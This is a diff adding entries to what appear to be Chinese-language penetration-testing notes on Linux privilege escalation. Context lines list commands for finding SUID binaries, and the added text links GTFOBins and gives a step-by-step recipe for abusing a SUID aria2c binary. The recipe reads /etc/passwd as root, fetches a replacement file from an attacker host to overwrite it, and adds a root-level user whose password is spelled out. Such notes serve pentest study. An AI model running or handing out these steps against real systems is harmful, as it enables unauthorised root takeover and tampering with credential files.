@@ -145,6 +145,14 @@
 	- ``find / -user root -perm -4000 -print 2>/dev/null``
 	- ``find / -user root -perm -4000 -exec ls -ldb {} \;``
 	- ``常用的提权文件：Nmap,Vim,find,Bash,More,Less,Nano,cp,netcat``
+	
+	::
+	
+	
+		GTFOBins是Unix二进制文件的精选列表,可用于绕过配置错误的系统中的本地安全限制。
+		可用于查询suid权限的文件是否能够越权。
+		https://gtfobins.github.io
+		
 - 利用可用的root权限
     - ``sudo -l``
 	::
@@ -286,6 +294,23 @@
 				printf("ret val: %d errno: %d\n", ret_val, errno);
 				return errno;
 			}
+	
+	- aria2c
+		::
+		
+			前提是具有SUID权限。
+			#Copy /etc/passwd by read as a root
+			/usr/bin/aria2c -i /etc/passwd
+			
+			#Add user with root rigts in the file
+			Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash
+			
+			#Upload it inside /etc (must be in /etc directory)
+			/usr/bin/aria2c -o passwd "http://<ip>/newpasswd" --allow-overwrite=true
+			
+			#Get the shell! (Pass : Password@973)
+			su Tom
+			
 			
 持久化
 ----------------------------------------
